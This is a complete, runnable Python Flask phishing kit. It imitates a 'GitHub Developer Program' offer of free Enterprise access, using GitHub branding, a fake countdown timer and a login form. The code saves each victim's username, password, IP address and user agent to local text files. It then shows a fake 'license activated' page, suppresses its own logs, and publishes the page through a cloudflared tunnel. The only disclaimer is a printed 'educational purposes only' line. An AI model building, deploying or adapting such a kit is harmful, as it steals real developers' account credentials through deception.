import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'github-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/GitHub Pro")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['gh_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>GitHub Developer Program - Free Pro Access</title>
        <style>
            :root {
                --github-black: #0d1117;
                --github-gray: #161b22;
                --github-blue: #1f6feb;
                --github-green: #238636;
                --github-purple: #8957e5;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
                color: #e6edf3;
                -webkit-text-size-adjust: 100%;
            }
            
            .login-box {
                background: rgba(22, 27, 34, 0.95);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 500px;
                padding: 25px;
                border-radius: 12px;
                text-align: center;
                border: 1px solid #30363d;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
                margin: 0 auto;
            }
            
            .github-header {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .github-logo-img {
                height: 48px;
                width: auto;
                filter: brightness(0) invert(1);
            }
            
            .github-logo-text {
                font-size: 32px;
                font-weight: 800;
                color: white;
                margin: 0;
            }
            
            .pro-banner {
                background: linear-gradient(90deg, #1f6feb 0%, #8957e5 50%, #1f6feb 100%);
                color: white;
                padding: 14px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 600;
                font-size: 18px;
                border: 2px solid #30363d;
                line-height: 1.4;
            }
            
            .enterprise-badge {
                background: linear-gradient(90deg, #238636 0%, #2ea043 50%, #238636 100%);
                color: white;
                padding: 12px;
                border-radius: 6px;
                margin: 15px 0;
                font-weight: 600;
                font-size: 15px;
                border: 1px solid #238636;
                line-height: 1.4;
            }
            
            .giveaway-container {
                background: rgba(31, 111, 235, 0.1);
                border: 2px dashed var(--github-blue);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 600;
                line-height: 1.3;
            }
            
            .subtitle {
                color: #8b949e;
                font-size: 15px;
                margin-bottom: 25px;
                line-height: 1.5;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #f85149;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Monaco', 'Consolas', monospace;
                font-size: 22px;
                color: #f85149;
                text-align: center;
                font-weight: 600;
            }
            
            .features-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            .feature-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #30363d;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
            }
            
            .feature-item:hover {
                border-color: var(--github-blue);
                background: rgba(31, 111, 235, 0.05);
            }
            
            .feature-icon {
                font-size: 22px;
                margin-bottom: 8px;
                color: var(--github-blue);
            }
            
            .feature-label {
                font-size: 13px;
                color: #8b949e;
                margin-top: 6px;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #8b949e;
                font-size: 14px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: #0d1117;
                border: 2px solid #30363d;
                border-radius: 8px;
                color: white;
                font-size: 16px;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            input:focus {
                border-color: var(--github-blue);
                outline: none;
                background: #0d1117;
            }
            
            input::placeholder {
                color: #484f58;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #1f6feb, #8957e5);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 8px;
                font-weight: 600;
                font-size: 17px;
                width: 100%;
                margin: 20px 0 15px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-btn:hover, .login-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(31, 111, 235, 0.3);
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #e6edf3;
                font-size: 15px;
            }
            
            .benefit-icon {
                color: var(--github-green);
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                flex-shrink: 0;
            }
            
            .dev-badge {
                display: inline-flex;
                align-items: center;
                background: rgba(137, 87, 229, 0.2);
                color: var(--github-purple);
                padding: 5px 10px;
                border-radius: 20px;
                font-size: 11px;
                font-weight: 600;
                margin-left: 8px;
            }
            
            .warning-note {
                color: #f85149;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #30363d;
                padding-top: 15px;
                text-align: center;
                line-height: 1.5;
            }
            
            .language-tags {
                display: flex;
                flex-wrap: wrap;
                gap: 8px;
                justify-content: center;
                margin: 15px 0;
            }
            
            .language-tag {
                background: rgba(31, 111, 235, 0.1);
                border: 1px solid #30363d;
                border-radius: 20px;
                padding: 5px 10px;
                font-size: 11px;
                color: #8b949e;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .login-box {
                    padding: 20px;
                }
                
                .github-logo-text {
                    font-size: 28px;
                }
                
                .github-logo-img {
                    height: 42px;
                }
                
                .pro-banner {
                    font-size: 16px;
                    padding: 12px;
                }
                
                .enterprise-badge {
                    font-size: 14px;
                    padding: 10px;
                }
                
                h1 {
                    font-size: 24px;
                }
                
                .subtitle {
                    font-size: 14px;
                }
                
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
                
                .features-grid {
                    grid-template-columns: 1fr;
                    gap: 10px;
                }
                
                .feature-item {
                    padding: 12px;
                }
                
                .benefit-item {
                    font-size: 14px;
                }
                
                input {
                    padding: 12px;
                    font-size: 16px;
                }
                
                .login-btn {
                    padding: 14px;
                    font-size: 16px;
                }
            }
            
            @media (max-width: 360px) {
                .github-header {
                    flex-direction: column;
                    gap: 10px;
                }
                
                .github-logo-text {
                    font-size: 24px;
                }
                
                h1 {
                    font-size: 22px;
                }
                
                .pro-banner, .enterprise-badge {
                    font-size: 13px;
                }
            }
        </style>
    </head>
    <body>
        <div style="display: flex; flex-direction: column; align-items: center;">
            <div class="login-box">
                <div class="github-header">
                    <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" 
                         alt="GitHub Logo" 
                         class="github-logo-img">
                    <div class="github-logo-text">GitHub</div>
                </div>
                
                <div class="pro-banner">
                    🚀 GITHUB DEVELOPER PROGRAM 🚀
                </div>
                
                <div class="enterprise-badge">
                    FREE GITHUB ENTERPRISE FOR OPEN SOURCE CONTRIBUTORS
                </div>
                
                <div class="giveaway-container">
                    <h1>Claim GitHub Enterprise Access</h1>
                    <div class="subtitle">
                        For active developers and open source contributors <span class="dev-badge">Verified</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        15:00
                    </div>
                </div>
                
                <div class="language-tags">
                    <span class="language-tag">JavaScript</span>
                    <span class="language-tag">Python</span>
                    <span class="language-tag">Java</span>
                    <span class="language-tag">C++</span>
                    <span class="language-tag">Go</span>
                    <span class="language-tag">Rust</span>
                    <span class="language-tag">TypeScript</span>
                </div>
                
                <div class="features-grid">
                    <div class="feature-item">
                        <div class="feature-icon">⚡</div>
                        <div>GitHub Actions</div>
                        <div class="feature-label">CI/CD Minutes</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">🔒</div>
                        <div>Advanced Security</div>
                        <div class="feature-label">Code Scanning</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">📦</div>
                        <div>GitHub Packages</div>
                        <div class="feature-label">Storage & Bandwidth</div>
                    </div>
                    <div class="feature-item">
                        <div class="feature-icon">👥</div>
                        <div>Team Management</div>
                        <div class="feature-label">Unlimited Members</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        GitHub Enterprise Server License
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        50,000 Actions Minutes/Month
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        500GB GitHub Packages Storage
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Advanced Security & Insights
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Priority Support 24/7
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">GITHUB USERNAME OR EMAIL ADDRESS</label>
                        <input type="text" name="username" placeholder="Enter your GitHub username or email" required>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">PASSWORD</label>
                        <input type="password" name="password" placeholder="Enter your password" required>
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🚀 Claim GitHub Enterprise Access
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ This GitHub Developer Program offer ends in 15 minutes. Access will be granted within 24 hours of verification.
                </div>
            </div>
        </div>
        
        <script>
            // Countdown timer
            let timeLeft = 900; // 15 minutes in seconds
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) { // Last 5 minutes
                    countdownElement.style.background = 'rgba(248, 81, 73, 0.2)';
                    countdownElement.style.animation = 'pulse 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Program Closed!";
                    countdownElement.style.color = '#f85149';
                }
            }
            
            updateTimer();
            
            // Add pulse animation for last 5 minutes
            const style = document.createElement('style');
            style.textContent = `
                @keyframes pulse {
                    0% { opacity: 1; }
                    50% { opacity: 0.7; }
                    100% { opacity: 1; }
                }
            `;
            document.head.appendChild(style);
            
            // Prevent zoom on mobile input focus
            document.addEventListener('touchstart', function() {}, {passive: true});
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('gh_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: GitHub Developer Program\n")
        file.write(f"Promised: GitHub Enterprise Access\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>GitHub Enterprise Activation</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
                color: #e6edf3;
                -webkit-text-size-adjust: 100%;
            }
            
            .container {
                text-align: center;
                background: rgba(22, 27, 34, 0.95);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 16px;
                max-width: 600px;
                border: 1px solid #30363d;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            .github-header {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 15px;
                margin-bottom: 20px;
            }
            
            .github-logo-img {
                height: 42px;
                width: auto;
                filter: invert(100%) sepia(0%) saturate(0%) hue-rotate(93deg) brightness(103%) contrast(103%);
            }
            
            .github-logo-text {
                font-size: 32px;
                font-weight: 800;
                color: white;
                margin: 0;
            }
            
            .processing-container {
                background: rgba(31, 111, 235, 0.1);
                border: 2px solid #1f6feb;
                border-radius: 12px;
                padding: 20px;
                margin: 25px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 8px;
                background: rgba(255, 255, 255, 0.05);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #1f6feb, #8957e5, #238636);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .enterprise-activated {
                background: rgba(137, 87, 229, 0.1);
                border: 2px solid #8957e5;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #238636;
                font-weight: bold;
                font-size: 20px;
                margin-right: 12px;
                flex-shrink: 0;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #e6edf3;
                font-size: 16px;
            }
            
            .license-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #1f6feb, #8957e5);
                color: white;
                padding: 10px 20px;
                border-radius: 20px;
                font-size: 15px;
                font-weight: 600;
                margin: 20px 0;
            }
            
            .terminal {
                background: #0d1117;
                border: 1px solid #30363d;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
                font-family: 'Monaco', 'Consolas', monospace;
                font-size: 13px;
                color: #8b949e;
                text-align: left;
                overflow-x: auto;
                white-space: pre-wrap;
                word-wrap: break-word;
            }
            
            .terminal-line {
                margin: 6px 0;
            }
            
            .terminal-prompt {
                color: #238636;
            }
            
            .terminal-command {
                color: #e6edf3;
            }
            
            .terminal-output {
                color: #8b949e;
            }
            
            h2 {
                margin: 10px 0;
                color: #1f6feb;
                font-size: 22px;
            }
            
            h3 {
                margin: 15px 0;
                color: #e6edf3;
                font-size: 18px;
            }
            
            p {
                color: #8b949e;
                line-height: 1.5;
                margin: 15px 0;
            }
            
            @media (max-width: 480px) {
                body {
                    padding: 15px;
                }
                
                .container {
                    padding: 20px;
                }
                
                .github-logo-text {
                    font-size: 28px;
                }
                
                .github-logo-img {
                    height: 38px;
                }
                
                h2 {
                    font-size: 20px;
                }
                
                h3 {
                    font-size: 16px;
                }
                
                .status-item {
                    font-size: 15px;
                }
                
                .terminal {
                    font-size: 12px;
                    padding: 12px;
                }
                
                .license-badge {
                    font-size: 14px;
                    padding: 8px 16px;
                }
                
                .processing-container {
                    padding: 15px;
                }
            }
            
            @media (max-width: 360px) {
                .github-header {
                    flex-direction: column;
                    gap: 10px;
                }
                
                .github-logo-text {
                    font-size: 24px;
                }
                
                h2 {
                    font-size: 18px;
                }
                
                .status-item {
                    font-size: 14px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="github-header">
                <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" 
                     alt="GitHub Logo" 
                     class="github-logo-img">
                <div class="github-logo-text">GitHub</div>
            </div>
            
            <div class="license-badge">
                ENTERPRISE LICENSE ACTIVATED
            </div>
            
            <h2>GitHub Enterprise Enabled</h2>
            <p>Your developer account is being upgraded</p>
            
            <div class="processing-container">
                <h3>Configuring Enterprise Features</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Provisioning resources and setting up permissions...</p>
            </div>
            
            <div class="terminal">
                <div class="terminal-line">
                    <span class="terminal-prompt">$</span> <span class="terminal-command">git status</span>
                </div>
                <div class="terminal-line terminal-output">
                    On branch main<br>
                    Your branch is up to date with 'origin/main'.
                </div>
                <div class="terminal-line">
                    <span class="terminal-prompt">$</span> <span class="terminal-command">git enterprise --enable</span>
                </div>
                <div class="terminal-line terminal-output">
                    ✓ GitHub Enterprise enabled<br>
                    ✓ 50,000 Actions minutes allocated<br>
                    ✓ 500GB Packages storage provisioned<br>
                    ✓ Advanced security features activated
                </div>
            </div>
            
            <div class="enterprise-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Enterprise License</strong> - Valid for 1 year
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Actions Minutes</strong> - 50,000/month
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Packages Storage</strong> - 500GB
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Security Features</strong> - Code scanning enabled
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Support Level</strong> - Priority 24/7
                </div>
            </div>
            
            <p>
                You will be redirected to GitHub shortly...
                <br>
                <small style="color: #484f58;">Your Enterprise features will be available within 24 hours</small>
            </p>
        </div>
        
        <script>
            // Terminal animation
            const terminalLines = document.querySelectorAll('.terminal-line');
            terminalLines.forEach((line, index) => {
                line.style.opacity = 0;
                setTimeout(() => {
                    line.style.transition = 'opacity 0.5s';
                    line.style.opacity = 1;
                }, index * 500);
            });
            
            // Prevent zoom on mobile
            document.addEventListener('touchstart', function() {}, {passive: true});
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"💻 GitHub Developer Public Link: {tunnel_url}")
            print(f"🔐 Promising: FREE GitHub Enterprise Access")
            print(f"💾 Credentials saved to: {BASE_FOLDER}")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real GitHub credentials!")
            print("⚠️  GitHub accounts have immense value for developers!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5005, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting GitHub Developer Program Page...")
    print("📱 Port: 5005")
    print("💾 Save location: ~/storage/downloads/GitHubPro/")
    print("🔐 Promising: FREE GitHub Enterprise Access")
    print("⚡ Features: 50K Actions minutes, 500GB storage, Advanced Security")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5005")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)